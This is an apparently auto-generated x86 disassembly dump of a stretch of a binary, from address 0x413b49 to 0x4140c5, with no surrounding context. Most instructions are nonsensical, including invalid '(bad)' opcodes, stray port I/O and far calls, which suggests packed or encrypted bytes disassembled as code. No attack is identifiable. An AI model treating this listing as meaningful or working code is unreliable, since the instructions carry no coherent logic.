  413b49:	7f 03                	jg     0x413b4e
  413b4b:	74 43                	je     0x413b90
  413b4d:	3d dd 67 ba a4       	cmp    $0xa4ba67dd,%eax
  413b52:	0b 78 17             	or     0x17(%eax),%edi
  413b55:	bc 0b 7c 7f cd       	mov    $0xcd7f7c0b,%esp
  413b5a:	fd                   	std
  413b5b:	5d                   	pop    %ebp
  413b5c:	b3 03                	mov    $0x3,%bl
  413b5e:	28 80 0b 04 64 ff    	sub    %al,-0x9bfbf5(%eax)
  413b64:	04 68                	add    $0x68,%al
  413b66:	ff 05 88 91 db 8a    	incl   0x8adb9188
  413b6c:	5b                   	pop    %ebx
  413b6d:	c3                   	ret
  413b6e:	0d 14 ee 08 0d       	or     $0xd08ee14,%eax
  413b73:	0d 58 2a 6c 18       	or     $0x186c2a58,%eax
  413b78:	d6                   	salc
  413b79:	9a bf 70 1b 04 fa fd 	lcall  $0xfdfa,$0x41b70bf
  413b80:	c7                   	(bad)
  413b81:	60                   	pusha
  413b82:	ff 0a                	decl   (%edx)
  413b84:	05 32 02 11 c7       	add    $0xc7110232,%eax
  413b89:	2b de                	sub    %esi,%ebx
  413b8b:	b6 0b                	mov    $0xb,%dh
  413b8d:	1a 1e                	sbb    (%esi),%bl
  413b8f:	fd                   	std
  413b90:	95                   	xchg   %eax,%ebp
  413b91:	10 97 6b 49 60 90    	adc    %dl,-0x6f9fb695(%edi)
  413b97:	5b                   	pop    %ebx
  413b98:	1c 87                	sbb    $0x87,%al
  413b9a:	00 28                	add    %ch,(%eax)
  413b9c:	13 bf a8 a5 e2 60    	adc    0x60e2a5a8(%edi),%edi
  413ba2:	dd 01                	fldl   (%ecx)
  413ba4:	6c                   	insb   (%dx),%es:(%edi)
  413ba5:	49                   	dec    %ecx
  413ba6:	18 b9 0e c7 30 f1    	sbb    %bh,-0xecf38f2(%ecx)
  413bac:	97                   	xchg   %eax,%edi
  413bad:	2d 60 03 5f 80       	sub    $0x805f0360,%eax
  413bb2:	1b b4 42 03 17 ff 80 	sbb    -0x7f00e8fd(%edx,%eax,2),%esi
  413bb9:	db 74 ff 34          	(bad) 0x34(%edi,%edi,8)
  413bbd:	6c                   	insb   (%dx),%es:(%edi)
  413bbe:	eb 3a                	jmp    0x413bfa
  413bc0:	6e                   	outsb  %ds:(%esi),(%dx)
  413bc1:	6c                   	insb   (%dx),%es:(%edi)
  413bc2:	03 80 81 0a 1f 86    	add    -0x79e0f57f(%eax),%eax
  413bc8:	3c 0b                	cmp    $0xb,%al
  413bca:	6c                   	insb   (%dx),%es:(%edi)
  413bcb:	15 77 3b ac 7b       	adc    $0x7bac3b77,%eax
  413bd0:	fc                   	cld
  413bd1:	58                   	pop    %eax
  413bd2:	2f                   	das
  413bd3:	13 14 1d 6c 2a 0a 15 	adc    0x150a2a6c(,%ebx,1),%edx
  413bda:	6c                   	insb   (%dx),%es:(%edi)
  413bdb:	9b                   	fwait
  413bdc:	7b 93                	jnp    0x413b71
  413bde:	31 1d 14 13 44 13    	xor    %ebx,0x13441314
  413be4:	14 b0                	adc    $0xb0,%al
  413be6:	d6                   	salc
  413be7:	9d                   	popf
  413be8:	15 33 10 20 4c       	adc    $0x4c201033,%eax
  413bed:	c4 8b 15 46 36 9b    	les    -0x64c9b9eb(%ebx),%ecx
  413bf3:	0c 0c                	or     $0xc,%al
  413bf5:	97                   	xchg   %eax,%edi
  413bf6:	1b e6                	sbb    %esi,%esp
  413bf8:	ff c3                	inc    %ebx
  413bfa:	ce                   	into
  413bfb:	83 e9 0e             	sub    $0xe,%ecx
  413bfe:	0b 40 46             	or     0x46(%eax),%eax
  413c01:	5c                   	pop    %esp
  413c02:	ff                   	(bad)
  413c03:	fc                   	cld
  413c04:	f6 6c ff 00          	imulb  0x0(%edi,%edi,8)
  413c08:	05 4b 5a b3 fd       	add    $0xfdb35a4b,%eax
  413c0d:	ef                   	out    %eax,(%dx)
  413c0e:	17                   	pop    %ss
  413c0f:	04 6c                	add    $0x6c,%al
  413c11:	8c 46 4c             	mov    %es,0x4c(%esi)
  413c14:	ff                   	(bad)
  413c15:	fb                   	sti
  413c16:	94                   	xchg   %eax,%esp
  413c17:	5c                   	pop    %esp
  413c18:	61                   	popa
  413c19:	01 35 07 20 67 a7    	add    %esi,0xa7672007
  413c1f:	8d                   	lea    (bad),%ecx
  413c20:	c8 0a 06 1d          	enter  $0x60a,$0x1d
  413c24:	10 3a                	adc    %bh,(%edx)
  413c26:	9a 05 5a 4b 14 0c cd 	lcall  $0xcd0c,$0x144b5a05
  413c2d:	54                   	push   %esp
  413c2e:	07                   	pop    %es
  413c2f:	76 ae                	jbe    0x413bdf
  413c31:	10 13                	adc    %dl,(%ebx)
  413c33:	00 0f                	add    %cl,(%edi)
  413c35:	5c                   	pop    %esp
  413c36:	6f                   	outsl  %ds:(%esi),(%dx)
  413c37:	dd 98 33 8b 7d 35    	fstpl  0x357d8b33(%eax)
  413c3d:	5c                   	pop    %esp
  413c3e:	1b 32                	sbb    (%edx),%esi
  413c40:	2a 23                	sub    (%ebx),%ah
  413c42:	70 df                	jo     0x413c23
  413c44:	c2 61 7b             	ret    $0x7b61
  413c47:	fd                   	std
  413c48:	06                   	push   %es
  413c49:	6c                   	insb   (%dx),%es:(%edi)
  413c4a:	9a 01 68 92 5e de 1a 	lcall  $0x1ade,$0x5e926801
  413c51:	16                   	push   %ss
  413c52:	ba 14 e0 71 41       	mov    $0x4171e014,%edx
  413c57:	3c 97                	cmp    $0x97,%al
  413c59:	71 c0                	jno    0x413c1b
  413c5b:	32 06                	xor    (%esi),%al
  413c5d:	00 af a1 b5 d6 24    	add    %ch,0x24d6b5a1(%edi)
  413c63:	1f                   	pop    %ds
  413c64:	1a c5                	sbb    %ch,%al
  413c66:	15 f5 49 6c ef       	adc    $0xef6c49f5,%eax
  413c6b:	df da                	(bad)
  413c6d:	c7                   	(bad)
  413c6e:	1c 77                	sbb    $0x77,%al
  413c70:	8b f4                	mov    %esp,%esi
  413c72:	ff 70 7a             	push   0x7a(%eax)
  413c75:	ff 1e                	lcall  *(%esi)
  413c77:	5d                   	pop    %ebp
  413c78:	53                   	push   %ebx
  413c79:	0b 00                	or     (%eax),%eax
  413c7b:	e4 13                	in     $0x13,%al
  413c7d:	ca ce 5c             	lret   $0x5cce
  413c80:	00 15 23 18 00 64    	add    %dl,0x64001823
  413c86:	d2 1c 08             	rcrb   %cl,(%eax,%ecx,1)
  413c89:	81 ab 70 6c 99 90 8d 	subl   $0x70e62e8d,-0x6f669390(%ebx)
  413c90:	2e e6 70 
  413c93:	23 74 74 b6          	and    -0x4a(%esp,%esi,2),%esi
  413c97:	85 91 67 50 70 31    	test   %edx,0x31705067(%ecx)
  413c9d:	8c 2f                	mov    %gs,(%edi)
  413c9f:	09 1a                	or     %ebx,(%edx)
  413ca1:	b3 ef                	mov    $0xef,%bl
  413ca3:	41                   	inc    %ecx
  413ca4:	d6                   	salc
  413ca5:	14 28                	adc    $0x28,%al
  413ca7:	4a                   	dec    %edx
  413ca8:	f5                   	cmc
  413ca9:	58                   	pop    %eax
  413caa:	c7                   	(bad)
  413cab:	28 9d 2b 57 d8 1c    	sub    %bl,0x1cd8572b(%ebp)
  413cb1:	77 54                	ja     0x413d07
  413cb3:	3e 50                	ds push %eax
  413cb5:	24 14                	and    $0x14,%al
  413cb7:	40                   	inc    %eax
  413cb8:	46                   	inc    %esi
  413cb9:	d7                   	xlat   %ds:(%ebx)
  413cba:	40                   	inc    %eax
  413cbb:	ab                   	stos   %eax,%es:(%edi)
  413cbc:	04 a1                	add    $0xa1,%al
  413cbe:	78 63                	js     0x413d23
  413cc0:	c7                   	(bad)
  413cc1:	24 63                	and    $0x63,%al
  413cc3:	dd 78 9f             	fnstsw -0x61(%eax)
  413cc6:	14 b7                	adc    $0xb7,%al
  413cc8:	02 74 5f ed          	add    -0x13(%edi,%ebx,2),%dh
  413ccc:	ad                   	lods   %ds:(%esi),%eax
  413ccd:	96                   	xchg   %eax,%esi
  413cce:	6e                   	outsb  %ds:(%esi),(%dx)
  413ccf:	0b 19                	or     (%ecx),%ebx
  413cd1:	1d 23 1b 84 fb       	sbb    $0xfb841b23,%eax
  413cd6:	30 2f                	xor    %ch,(%edi)
  413cd8:	07                   	pop    %es
  413cd9:	b2 ed                	mov    $0xed,%dl
  413cdb:	a3 b7 1c 24 13       	mov    %eax,0x13241cb7
  413ce0:	0b 09                	or     (%ecx),%ecx
  413ce2:	04 50                	add    $0x50,%al
  413ce4:	77 78                	ja     0x413d5e
  413ce6:	7a 85                	jp     0x413c6d
  413ce8:	c6                   	(bad)
  413ce9:	ec                   	in     (%dx),%al
  413cea:	b1 f3                	mov    $0xf3,%cl
  413cec:	34 f1                	xor    $0xf1,%al
  413cee:	61                   	popa
  413cef:	c9                   	leave
  413cf0:	e0 30                	loopne 0x413d22
  413cf2:	b4 3e                	mov    $0x3e,%ah
  413cf4:	24 84                	and    $0x84,%al
  413cf6:	64 84 06             	test   %al,%fs:(%esi)
  413cf9:	ed                   	in     (%dx),%eax
  413cfa:	16                   	push   %ss
  413cfb:	b6 67                	mov    $0x67,%dh
  413cfd:	0a 68 33             	or     0x33(%eax),%ch
  413d00:	54                   	push   %esp
  413d01:	f3 0b 8e 32 0c b6 6f 	repz or 0x6fb60c32(%esi),%ecx
  413d08:	8b d0                	mov    %eax,%edx
  413d0a:	65 78 7d             	gs js  0x413d8a
  413d0d:	29 50 a9             	sub    %edx,-0x57(%eax)
  413d10:	35 19 13 42 33       	xor    $0x33421319,%eax
  413d15:	10 93 df d1 7f 63    	adc    %dl,0x637fd1df(%ebx)
  413d1b:	38 cf                	cmp    %cl,%bh
  413d1d:	d8 40 2c             	fadds  0x2c(%eax)
  413d20:	bb 08 00 31 d8       	mov    $0xd8310008,%ebx
  413d25:	d3 40 67             	roll   %cl,0x67(%eax)
  413d28:	1f                   	pop    %ds
  413d29:	50                   	push   %eax
  413d2a:	bf 54 22 b8 dd       	mov    $0xddb82254,%edi
  413d2f:	80 17 36             	adcb   $0x36,(%edi)
  413d32:	ad                   	lods   %ds:(%esi),%eax
  413d33:	f5                   	cmc
  413d34:	19 0d e7 eb 46 3a    	sbb    %ecx,0x3a46ebe7
  413d3a:	9e                   	sahf
  413d3b:	36 6c                	ss insb (%dx),%es:(%edi)
  413d3d:	16                   	push   %ss
  413d3e:	6c                   	insb   (%dx),%es:(%edi)
  413d3f:	02 fd                	add    %ch,%bh
  413d41:	71 3c                	jno    0x413d7f
  413d43:	b7 8e                	mov    $0x8e,%bh
  413d45:	c9                   	leave
  413d46:	52                   	push   %edx
  413d47:	39 6c 2d 71          	cmp    %ebp,0x71(%ebp,%ebp,1)
  413d4b:	53                   	push   %ebx
  413d4c:	2f                   	das
  413d4d:	6c                   	insb   (%dx),%es:(%edi)
  413d4e:	0b dd                	or     %ebp,%ebx
  413d50:	27                   	daa
  413d51:	1f                   	pop    %ds
  413d52:	18 70 cc             	sbb    %dh,-0x34(%eax)
  413d55:	1c 6a                	sbb    $0x6a,%al
  413d57:	71 80                	jno    0x413cd9
  413d59:	dd 43 ec             	fldl   -0x14(%ebx)
  413d5c:	9d                   	popf
  413d5d:	9a 8d 78 2e 14 5e 39 	lcall  $0x395e,$0x142e788d
  413d64:	34 2c                	xor    $0x2c,%al
  413d66:	db 39                	fstpt  (%ecx)
  413d68:	1e                   	push   %ds
  413d69:	da f8                	(bad)
  413d6b:	03 10                	add    (%eax),%edx
  413d6d:	72 1b                	jb     0x413d8a
  413d6f:	0b 0a                	or     (%edx),%ecx
  413d71:	9c                   	pushf
  413d72:	fb                   	sti
  413d73:	70 21                	jo     0x413d96
  413d75:	ac                   	lods   %ds:(%esi),%al
  413d76:	31 28                	xor    %ebp,(%eax)
  413d78:	6b 47 14 01          	imul   $0x1,0x14(%edi),%eax
  413d7c:	91                   	xchg   %eax,%ecx
  413d7d:	40                   	inc    %eax
  413d7e:	26 a1 94 93 00 33    	mov    %es:0x33009394,%eax
  413d84:	4d                   	dec    %ebp
  413d85:	8e 85 f3 43 30 00    	mov    0x3043f3(%ebp),%es
  413d8b:	07                   	pop    %es
  413d8c:	6f                   	outsl  %ds:(%esi),(%dx)
  413d8d:	77 ed                	ja     0x413d7c
  413d8f:	b4 04                	mov    $0x4,%ah
  413d91:	4c                   	dec    %esp
  413d92:	3b 65 07             	cmp    0x7(%ebp),%esp
  413d95:	28 3c ff             	sub    %bh,(%edi,%edi,8)
  413d98:	d7                   	xlat   %ds:(%ebx)
  413d99:	5d                   	pop    %ebp
  413d9a:	fb                   	sti
  413d9b:	2f                   	das
  413d9c:	59                   	pop    %ecx
  413d9d:	96                   	xchg   %eax,%esi
  413d9e:	c1 b6 2c 14 1c 1f 1c 	shll   $0x1c,0x1f1c142c(%esi)
  413da5:	0c 02                	or     $0x2,%al
  413da7:	16                   	push   %ss
  413da8:	f5                   	cmc
  413da9:	e7 e5                	out    %eax,$0xe5
  413dab:	0c fc                	or     $0xfc,%al
  413dad:	fe 0c ec             	decb   (%esp,%ebp,8)
  413db0:	fe                   	(bad)
  413db1:	fb                   	sti
  413db2:	27                   	daa
  413db3:	0f 70 6b cd f4       	pshufw $0xf4,-0x33(%ebx),%mm5
  413db8:	1b 36                	sbb    (%esi),%esi
  413dba:	08 30                	or     %dh,(%eax)
  413dbc:	36 23 1a             	and    %ss:(%edx),%ebx
  413dbf:	1c 85                	sbb    $0x85,%al
  413dc1:	bb b5 6d 6b 11       	mov    $0x116b6db5,%ebx
  413dc6:	07                   	pop    %es
  413dc7:	27                   	daa
  413dc8:	39 3a                	cmp    %edi,(%edx)
  413dca:	23 a6 4e 4c 56 3a    	and    0x3a564c4e(%esi),%esp
  413dd0:	b3 b5                	mov    $0xb5,%bl
  413dd2:	ef                   	out    %eax,(%dx)
  413dd3:	f5                   	cmc
  413dd4:	75 3a                	jne    0x413e10
  413dd6:	53                   	push   %ebx
  413dd7:	66 4e                	dec    %si
  413dd9:	71 05                	jno    0x413de0
  413ddb:	d1 cb                	ror    $1,%ebx
  413ddd:	0d e6 a9 33 2c       	or     $0x2c33a9e6,%eax
  413de2:	35 b9 16 4a fe       	xor    $0xfe4a16b9,%eax
  413de7:	3a a3 bb c0 00 8c    	cmp    -0x73ff3f45(%ebx),%ah
  413ded:	1d d3 74 93 74       	sbb    $0x749374d3,%eax
  413df2:	07                   	pop    %es
  413df3:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  413df4:	4c                   	dec    %esp
  413df5:	03 2c 1c             	add    (%esp,%ebx,1),%ebp
  413df8:	2f                   	das
  413df9:	a1 dc 4c 0c 95       	mov    0x950c4cdc,%eax
  413dfe:	02 00                	add    (%eax),%al
  413e00:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  413e01:	1c 0b                	sbb    $0xb,%al
  413e03:	6c                   	insb   (%dx),%es:(%edi)
  413e04:	97                   	xchg   %eax,%edi
  413e05:	8d 0f                	lea    (%edi),%ecx
  413e07:	d7                   	xlat   %ds:(%ebx)
  413e08:	23 74 31 09          	and    0x9(%ecx,%esi,1),%esi
  413e0c:	46                   	inc    %esi
  413e0d:	64 d0 0a             	rorb   $1,%fs:(%edx)
  413e10:	84 06                	test   %al,(%esi)
  413e12:	ad                   	lods   %ds:(%esi),%eax
  413e13:	cb                   	lret
  413e14:	ac                   	lods   %ds:(%esi),%al
  413e15:	35 0a ab 8a fb       	xor    $0xfb8aab0a,%eax
  413e1a:	af                   	scas   %es:(%edi),%eax
  413e1b:	3b 70 1b             	cmp    0x1b(%eax),%esi
  413e1e:	0b 70 fd             	or     -0x3(%eax),%esi
  413e21:	0c 07                	or     $0x7,%al
  413e23:	fc                   	cld
  413e24:	34 fc                	xor    $0xfc,%al
  413e26:	f8                   	clc
  413e27:	78 1d                	js     0x413e46
  413e29:	67 37                	addr16 aaa
  413e2b:	0f 1b 45 39          	bndstx %bnd0,0x39(%ebp)
  413e2f:	80 0c 40 ff          	orb    $0xff,(%eax,%eax,2)
  413e33:	25 49 60 77 ed       	and    $0xed776049,%eax
  413e38:	ed                   	in     (%dx),%eax
  413e39:	21 25 08 27 fe 9a    	and    %esp,0x9afe2708
  413e3f:	10 f6                	adc    %dh,%dh
  413e41:	9d                   	popf
  413e42:	fd                   	std
  413e43:	9f                   	lahf
  413e44:	fe                   	(bad)
  413e45:	1c 9b                	sbb    $0x9b,%al
  413e47:	06                   	push   %es
  413e48:	dc 98 0d 07 90 74    	fcompl 0x7490070d(%eax)
  413e4e:	36 06                	ss push %es
  413e50:	37                   	aaa
  413e51:	6a 78                	push   $0x78
  413e53:	b7 d6                	mov    $0xd6,%bh
  413e55:	31 1b                	xor    %ebx,(%ebx)
  413e57:	d2 fc                	sar    %cl,%ah
  413e59:	63 4f a5             	arpl   %ecx,-0x5b(%edi)
  413e5c:	03 c8                	add    %eax,%ecx
  413e5e:	6a 62                	push   $0x62
  413e60:	8c 07                	mov    %es,(%edi)
  413e62:	08 63 94             	or     %ah,-0x6c(%ebx)
  413e65:	8b 92 11 e8 18 78    	mov    0x7818e811(%edx),%edx
  413e6b:	67 24 17             	addr16 and $0x17,%al
  413e6e:	06                   	push   %es
  413e6f:	d3 74 dd 63          	shll   %cl,0x63(%ebp,%ebx,8)
  413e73:	60                   	pusha
  413e74:	87 db                	xchg   %ebx,%ebx
  413e76:	40                   	inc    %eax
  413e77:	03 20                	add    (%eax),%esp
  413e79:	10 77 4c             	adc    %dh,0x4c(%edi)
  413e7c:	60                   	pusha
  413e7d:	63 4b 93             	arpl   %ecx,-0x6d(%ebx)
  413e80:	58                   	pop    %eax
  413e81:	66 26 7c f4          	data16 es jl 0x413e79
  413e85:	01 f4                	add    %esi,%esp
  413e87:	16                   	push   %ss
  413e88:	d9 1a                	fstps  (%edx)
  413e8a:	6f                   	outsl  %ds:(%esi),(%dx)
  413e8b:	8b 5d 20             	mov    0x20(%ebp),%ebx
  413e8e:	01 2f                	add    %ebp,(%edi)
  413e90:	0a 02                	or     (%edx),%al
  413e92:	05 bb 9d f1 e1       	add    $0xe1f19dbb,%eax
  413e97:	01 5e bb             	add    %ebx,-0x45(%esi)
  413e9a:	71 54                	jno    0x413ef0
  413e9c:	70 6c                	jo     0x413f0a
  413e9e:	07                   	pop    %es
  413e9f:	04 58                	add    $0x58,%al
  413ea1:	18 77 e7             	sbb    %dh,-0x19(%edi)
  413ea4:	ba 6d 8e 49 11       	mov    $0x11498e6d,%edx
  413ea9:	69 80 31 0e ff 16 01 	imul   $0x16792f01,0x16ff0e31(%eax),%eax
  413eb0:	2f 79 16 
  413eb3:	46                   	inc    %esi
  413eb4:	3e 08 18             	or     %bl,%ds:(%eax)
  413eb7:	44                   	inc    %esp
  413eb8:	ef                   	out    %eax,(%dx)
  413eb9:	02 44 ed bb          	add    -0x45(%ebp,%ebp,8),%al
  413ebd:	76 60                	jbe    0x413f1f
  413ebf:	34 cb                	xor    $0xcb,%al
  413ec1:	ac                   	lods   %ds:(%esi),%al
  413ec2:	07                   	pop    %es
  413ec3:	fc                   	cld
  413ec4:	44                   	inc    %esp
  413ec5:	fd                   	std
  413ec6:	c2 32 44             	ret    $0x4432
  413ec9:	dd dc                	fstp   %st(4)
  413ecb:	e6 7e                	out    %al,$0x7e
  413ecd:	9e                   	sahf
  413ece:	fc                   	cld
  413ecf:	77 d9                	ja     0x413eaa
  413ed1:	1c 34                	sbb    $0x34,%al
  413ed3:	01 3f                	add    %edi,(%edi)
  413ed5:	fd                   	std
  413ed6:	3d c3 0e b3 ad       	cmp    $0xadb30ec3,%eax
  413edb:	31 03                	xor    %eax,(%ebx)
  413edd:	63 83 c5 8f c1 47    	arpl   %eax,0x47c18fc5(%ebx)
  413ee3:	bd 61 1a 13 0b       	mov    $0xb131a61,%ebp
  413ee8:	10 e4                	adc    %ah,%ah
  413eea:	12 62 d5             	adc    -0x2b(%edx),%ah
  413eed:	05 a8 2d d7 1a       	add    $0x1ad72da8,%eax
  413ef2:	92                   	xchg   %eax,%edx
  413ef3:	c5 96 64 02 83 05    	lds    0x5830264(%esi),%edx
  413ef9:	c6 01 a9             	movb   $0xa9,(%ecx)
  413efc:	3b b0 3b 44 1b 34    	cmp    0x341b443b(%eax),%esi
  413f02:	77 72                	ja     0x413f76
  413f04:	93                   	xchg   %eax,%ebx
  413f05:	e5 84                	in     $0x84,%eax
  413f07:	1a b3 00 3c 07 1e    	sbb    0x1e073c00(%ebx),%dh
  413f0d:	86 97 6a 7a fe d7    	xchg   %dl,-0x28018596(%edi)
  413f13:	15 28 0c 67 c0       	adc    $0xc0670c28,%eax
  413f18:	0e                   	push   %cs
  413f19:	d3 c6                	rol    %cl,%esi
  413f1b:	37                   	aaa
  413f1c:	0b e8                	or     %eax,%ebp
  413f1e:	03 fe                	add    %esi,%edi
  413f20:	68 09 6d da 71       	push   $0x71da6d09
  413f25:	b3 c6                	mov    $0xc6,%bl
  413f27:	ef                   	out    %eax,(%dx)
  413f28:	ba 27 29 07 d6       	mov    $0xd6072927,%edx
  413f2d:	f4                   	hlt
  413f2e:	64 eb b3             	fs jmp 0x413ee4
  413f31:	e8 04 1c d8 75       	call   0x76195b3a
  413f36:	b0 b5                	mov    $0xb5,%al
  413f38:	6f                   	outsl  %ds:(%esi),(%dx)
  413f39:	07                   	pop    %es
  413f3a:	fb                   	sti
  413f3b:	ef                   	out    %eax,(%dx)
  413f3c:	cc                   	int3
  413f3d:	fe                   	(bad)
  413f3e:	af                   	scas   %es:(%edi),%eax
  413f3f:	1f                   	pop    %ds
  413f40:	36 b2 ff             	ss mov $0xff,%dl
  413f43:	85 b6 5d ab 0e 69    	test   %esi,0x690eab5d(%esi)
  413f49:	3b fe                	cmp    %esi,%edi
  413f4b:	7e 36                	jle    0x413f83
  413f4d:	36 c2 73 bb          	ss ret $0xbb73
  413f51:	8d                   	lea    (bad),%esi
  413f52:	f2 1f                	repnz pop %ds
  413f54:	fd                   	std
  413f55:	1d 0c 57 25 5a       	sbb    $0x5a25570c,%eax
  413f5a:	ff 42 61             	incl   0x61(%edx)
  413f5d:	7e ae                	jle    0x413f0d
  413f5f:	41                   	inc    %ecx
  413f60:	dd be fe f7 bc fe    	fnstsw -0x1430802(%esi)
  413f66:	04 02                	add    $0x2,%al
  413f68:	71 b8                	jno    0x413f22
  413f6a:	da 55 d8             	ficoml -0x28(%ebp)
  413f6d:	c3                   	ret
  413f6e:	43                   	inc    %ebx
  413f6f:	fb                   	sti
  413f70:	fd                   	std
  413f71:	93                   	xchg   %eax,%ebx
  413f72:	0c 40                	or     $0x40,%al
  413f74:	6c                   	insb   (%dx),%es:(%edi)
  413f75:	0b f9                	or     %ecx,%edi
  413f77:	05 bb 0d 0c bc       	add    $0xbc0c0dbb,%eax
  413f7c:	17                   	pop    %ss
  413f7d:	1b 21                	sbb    (%ecx),%esp
  413f7f:	b6 0a                	mov    $0xa,%dh
  413f81:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  413f82:	2a cc                	sub    %ah,%cl
  413f84:	10 12                	adc    %dl,(%edx)
  413f86:	f2 27                	repnz daa
  413f88:	f7 c4 00 bc 00 3c    	test   $0x3c00bc00,%esp
  413f8e:	e7 8c                	out    %eax,$0x8c
  413f90:	36 a3 34 30 bb 60    	mov    %eax,%ss:0x60bb3034
  413f96:	d3 d1                	rcl    %cl,%ecx
  413f98:	46                   	inc    %esi
  413f99:	12 e6                	adc    %dh,%ah
  413f9b:	5c                   	pop    %esp
  413f9c:	ab                   	stos   %eax,%es:(%edi)
  413f9d:	87 da                	xchg   %ebx,%edx
  413f9f:	4e                   	dec    %esi
  413fa0:	da 9d db cc 03 27    	ficompl 0x2703ccdb(%ebp)
  413fa6:	58                   	pop    %eax
  413fa7:	9b                   	fwait
  413fa8:	35 07 3a 4f f3       	xor    $0xf34f3a07,%eax
  413fad:	95                   	xchg   %eax,%ebp
  413fae:	f8                   	clc
  413faf:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  413fb0:	fd                   	std
  413fb1:	f5                   	cmc
  413fb2:	08 02                	or     %al,(%edx)
  413fb4:	28 03                	sub    %al,(%ebx)
  413fb6:	96                   	xchg   %eax,%esi
  413fb7:	85 1f                	test   %ebx,(%edi)
  413fb9:	34 18                	xor    $0x18,%al
  413fbb:	09 43 14             	or     %eax,0x14(%ebx)
  413fbe:	00 58 05             	add    %bl,0x5(%eax)
  413fc1:	5a                   	pop    %edx
  413fc2:	d7                   	xlat   %ds:(%ebx)
  413fc3:	78 79                	js     0x41403e
  413fc5:	1e                   	push   %ds
  413fc6:	fb                   	sti
  413fc7:	e6 73                	out    %al,$0x73
  413fc9:	3e 34 6e             	ds xor $0x6e,%al
  413fcc:	05 b6 d6 c1 0d       	add    $0xdc1d6b6,%eax
  413fd1:	8a eb                	mov    %bl,%ch
  413fd3:	c8 9f 04 38          	enter  $0x49f,$0x38
  413fd7:	2a 48 a5             	sub    -0x5b(%eax),%cl
  413fda:	f9                   	stc
  413fdb:	b6 2a                	mov    $0x2a,%dh
  413fdd:	c3                   	ret
  413fde:	00 13                	add    %dl,(%ebx)
  413fe0:	01 68 90             	add    %ebp,-0x70(%eax)
  413fe3:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  413fe4:	39 90 28 02 7c 18    	cmp    %edx,0x187c0228(%eax)
  413fea:	c0 6e ad 39          	shrb   $0x39,-0x53(%esi)
  413fee:	03 93 a1 5c 46 68    	add    0x68465ca1(%ebx),%edx
  413ff4:	16                   	push   %ss
  413ff5:	d7                   	xlat   %ds:(%ebx)
  413ff6:	f7 90 ee 04 52 a4    	notl   -0x5badfb12(%eax)
  413ffc:	04 48                	add    $0x48,%al
  413ffe:	89 06                	mov    %eax,(%esi)
  414000:	2c a6                	sub    $0xa6,%al
  414002:	ae                   	scas   %es:(%edi),%al
  414003:	03 76 33             	add    0x33(%esi),%esi
  414006:	1c b9                	sbb    $0xb9,%al
  414008:	14 fc                	adc    $0xfc,%al
  41400a:	02 cc                	add    %ah,%cl
  41400c:	14 0f                	adc    $0xf,%al
  41400e:	b5 42                	mov    $0x42,%ch
  414010:	68 96 6c 04 c4       	push   $0xc4046c96
  414015:	17                   	pop    %ss
  414016:	9a a6 3b 8d b7 38 f7 	lcall  $0xf738,$0xb78d3ba6
  41401d:	03 48 18             	add    0x18(%eax),%ecx
  414020:	14 3e                	adc    $0x3e,%al
  414022:	12 18                	adc    (%eax),%bl
  414024:	b2 cb                	mov    $0xcb,%dl
  414026:	58                   	pop    %eax
  414027:	97                   	xchg   %eax,%edi
  414028:	3f                   	aas
  414029:	00 0f                	add    %cl,(%edi)
  41402b:	24 1a                	and    $0x1a,%al
  41402d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  41402e:	48                   	dec    %eax
  41402f:	aa                   	stos   %al,%es:(%edi)
  414030:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  414031:	4d                   	dec    %ebp
  414032:	33 84 c0 96 15 0d 1b 	xor    0x1b0d1596(%eax,%eax,8),%eax
  414039:	ba cd b6 83 05       	mov    $0x583b6cd,%edx
  41403e:	c3                   	ret
  41403f:	1c 81                	sbb    $0x81,%al
  414041:	63 09                	arpl   %ecx,(%ecx)
  414043:	fd                   	std
  414044:	31 cd                	xor    %ecx,%ebp
  414046:	29 ec                	sub    %ebp,%esp
  414048:	d0 0b                	rorb   $1,(%ebx)
  41404a:	e6 15                	out    %al,$0x15
  41404c:	6c                   	insb   (%dx),%es:(%edi)
  41404d:	38 1d 6c b2 c5 02    	cmp    %bl,0x2c5b26c
  414053:	39 14 1d c2 02 81 84 	cmp    %edx,-0x7b7efd3e(,%ebx,1)
  41405a:	4c                   	dec    %esp
  41405b:	cb                   	lret
  41405c:	e8 64 92 4f 68       	call   0x6890d2c5
  414061:	15 53 14 00 e4       	adc    $0xe4001453,%eax
  414066:	00 f5                	add    %dh,%ch
  414068:	21 98 89 6c 17 19    	and    %ebx,0x19176c89(%eax)
  41406e:	1b 08                	sbb    (%eax),%ecx
  414070:	6d                   	insl   (%dx),%es:(%edi)
  414071:	87 9e 1a 1f 2a 0b    	xchg   %ebx,0xb2a1f1a(%esi)
  414077:	23 68 c6             	and    -0x3a(%eax),%ebp
  41407a:	2a e1                	sub    %cl,%ah
  41407c:	25 db 8a 1c 2a       	and    $0x2a1c8adb,%eax
  414081:	ec                   	in     (%dx),%al
  414082:	d8 3c 38             	fdivrs (%eax,%edi,1)
  414085:	f0 2a b9 8e 2e f5 46 	lock sub 0x46f52e8e(%ecx),%bh
  41408c:	e4 2a                	in     $0x2a,%al
  41408e:	f9                   	stc
  41408f:	42                   	inc    %edx
  414090:	2b 09                	sub    (%ecx),%ecx
  414092:	00 0c d6             	add    %cl,(%esi,%edx,8)
  414095:	33 19                	xor    (%ecx),%ebx
  414097:	08 99 df f8 f6 e2    	or     %bl,-0x1d090721(%ecx)
  41409d:	14 48                	adc    $0x48,%al
  41409f:	13 25 5e 73 40 9e    	adc    0x9e40735e,%esp
  4140a5:	ed                   	in     (%dx),%eax
  4140a6:	eb b6                	jmp    0x41405e
  4140a8:	4e                   	dec    %esi
  4140a9:	04 7d                	add    $0x7d,%al
  4140ab:	28 1d 40 a4 1a 3c    	sub    %bl,0x3c1aa440
  4140b1:	1c 08                	sbb    $0x8,%al
  4140b3:	9d                   	popf
  4140b4:	86 ec                	xchg   %ch,%ah
  4140b6:	3c e3                	cmp    $0xe3,%al
  4140b8:	44                   	inc    %esp
  4140b9:	26 60                	es pusha
  4140bb:	7b 21                	jnp    0x4140de
  4140bd:	45                   	inc    %ebp
  4140be:	24 04                	and    $0x4,%al
  4140c0:	2d 0b 17 f0 b6       	sub    $0xb6f0170b,%eax
  4140c5:	b6 8d                	mov    $0x8d,%dh
